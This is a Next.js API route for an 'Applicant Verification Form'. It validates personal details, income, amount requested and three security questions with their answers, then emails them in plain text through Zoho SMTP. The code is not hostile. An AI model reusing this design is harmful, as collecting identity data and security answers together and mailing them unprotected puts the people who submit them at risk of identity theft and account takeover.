import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

const zohoUser = process.env.ZOHO_USER;
const zohoPass = process.env.ZOHO_PASS;
const toEmail = process.env.TO_EMAIL || process.env.ZOHO_USER;

function str(v: unknown): string {
  return typeof v === 'string' ? v.trim() : typeof v === 'number' ? String(v) : '';
}

function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function row(label: string, value: string) {
  return `<tr><td style="padding:6px 12px 6px 0;font-weight:600;vertical-align:top;color:#555;">${escapeHtml(label)}</td><td style="padding:6px 0;">${escapeHtml(value)}</td></tr>`;
}

interface VerificationPayload {
  fullName: string;
  email: string;
  phone: string;
  country: string;
  state: string;
  city: string;
  address: string;
  postal: string;
  dateOfBirth: string;
  maritalStatus: string;
  employmentStatus: string;
  monthlyIncome: string;
  employer: string;
  dependents: string;
  category: string;
  amountRequested: string;
  storySummary: string;
  q1: string;
  a1: string;
  q2: string;
  a2: string;
  q3: string;
  a3: string;
  confirm: boolean;
}

function validate(body: unknown): VerificationPayload | null {
  if (!body || typeof body !== 'object') return null;
  const o = body as Record<string, unknown>;
  const payload: VerificationPayload = {
    fullName: str(o.fullName),
    email: str(o.email),
    phone: str(o.phone),
    country: str(o.country),
    state: str(o.state),
    city: str(o.city),
    address: str(o.address),
    postal: str(o.postal),
    dateOfBirth: str(o.dateOfBirth),
    maritalStatus: str(o.maritalStatus),
    employmentStatus: str(o.employmentStatus),
    monthlyIncome: str(o.monthlyIncome),
    employer: str(o.employer),
    dependents: str(o.dependents),
    category: str(o.category),
    amountRequested: str(o.amountRequested),
    storySummary: str(o.storySummary),
    q1: str(o.q1),
    a1: str(o.a1),
    q2: str(o.q2),
    a2: str(o.a2),
    q3: str(o.q3),
    a3: str(o.a3),
    confirm: o.confirm === true,
  };

  const required = Object.entries(payload)
    .filter(([k]) => k !== 'confirm')
    .map(([, v]) => v);

  if (required.some((v) => !v) || !payload.confirm) return null;
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payload.email)) return null;
  return payload;
}

export async function POST(request: NextRequest) {
  const parsed = validate(await request.json());
  if (!parsed) {
    return NextResponse.json(
      { error: 'Please complete every field, including three security questions, and confirm the checkbox.' },
      { status: 400 }
    );
  }

  if (!zohoUser || !zohoPass) {
    return NextResponse.json({ error: 'Submission is temporarily unavailable. Please try again later.' }, { status: 500 });
  }

  const transporter = nodemailer.createTransport({
    host: 'smtp.zoho.com',
    port: 465,
    secure: true,
    auth: { user: zohoUser, pass: zohoPass },
  });

  const html = `
    <h2>Applicant Verification Form — Submitted</h2>
    <table style="border-collapse:collapse;font-size:14px;line-height:1.5;">
      ${row('Full name', parsed.fullName)}
      ${row('Email', parsed.email)}
      ${row('Phone', parsed.phone)}
      ${row('Country', parsed.country)}
      ${row('State / Region', parsed.state)}
      ${row('City', parsed.city)}
      ${row('Address', parsed.address)}
      ${row('Postal', parsed.postal)}
      ${row('Date of birth', parsed.dateOfBirth)}
      ${row('Marital status', parsed.maritalStatus)}
      ${row('Employment status', parsed.employmentStatus)}
      ${row('Monthly income', parsed.monthlyIncome)}
      ${row('Employer / business', parsed.employer)}
      ${row('Dependents', parsed.dependents)}
      ${row('Category', parsed.category)}
      ${row('Amount requested', parsed.amountRequested)}
      ${row('Story summary', parsed.storySummary)}
      ${row('Security Q1', parsed.q1)}
      ${row('Security A1', parsed.a1)}
      ${row('Security Q2', parsed.q2)}
      ${row('Security A2', parsed.a2)}
      ${row('Security Q3', parsed.q3)}
      ${row('Security A3', parsed.a3)}
    </table>
    <p style="margin-top:16px;color:#666;font-size:12px;">Submitted via https://www.edwinmega.com/documents/verification-form.html</p>
  `;

  try {
    await transporter.sendMail({
      from: zohoUser,
      to: toEmail || zohoUser,
      replyTo: parsed.email,
      subject: `[Verification] ${parsed.fullName} — ${parsed.category}`,
      text: `Verification from ${parsed.fullName} (${parsed.email})\nDOB: ${parsed.dateOfBirth}\nMarital: ${parsed.maritalStatus}\nEmployment: ${parsed.employmentStatus}\nIncome: ${parsed.monthlyIncome}\nCategory: ${parsed.category}\nAmount: ${parsed.amountRequested}`,
      html,
    });
    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('Verification submit error:', err);
    return NextResponse.json({ error: 'Could not submit your form. Please try again.' }, { status: 500 });
  }
}
